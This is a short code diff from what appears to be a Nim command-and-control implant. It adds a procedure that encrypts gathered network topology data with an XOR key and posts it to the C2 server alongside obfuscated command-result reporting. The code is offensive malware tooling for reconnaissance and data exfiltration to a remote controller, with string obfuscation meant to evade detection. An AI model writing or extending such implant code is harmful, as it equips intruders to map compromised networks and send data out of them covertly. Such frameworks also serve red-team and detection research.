@@ -490,6 +490,27 @@ proc postCommandResults*(li : Listener, cmdGuid : string, output : string) : voi
     var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
     discard doRequest(li, li.resultPath, "data", encryptData(data, li.UNIQUE_XOR_KEY), "post")
 
+# Send topology update to C2 server
+proc postTopologyUpdate*(li : Listener, topologyData : string) : void =
+    when defined verbose:
+        echo obf("DEBUG: Sending topology update to C2 server")
+        echo obf("DEBUG: Topology data (first 100 chars): ") & 
+             (if topologyData.len > 100: topologyData[0..99] & "..." else: topologyData)
+    
+    let encryptedData = encryptData(topologyData, li.UNIQUE_XOR_KEY)
+    let topologyPath = li.resultPath & obf("/topology")
+    
+    when defined verbose:
+        echo obf("DEBUG: Topology path: ") & topologyPath
+        echo obf("DEBUG: Encrypted topology data length: ") & $encryptedData.len
+    
+    let res = doRequest(li, topologyPath, "data", encryptedData, "post")
+    
+    when defined verbose:
+        echo obf("DEBUG: Topology update response code: ") & $res.code
+        if res.code != 200:
+            echo obf("DEBUG: Topology update response body: ") & res.body
+
 # Announce that the kill timer has expired
 proc killSelf*(li : Listener) : void =
     if li.initialized:
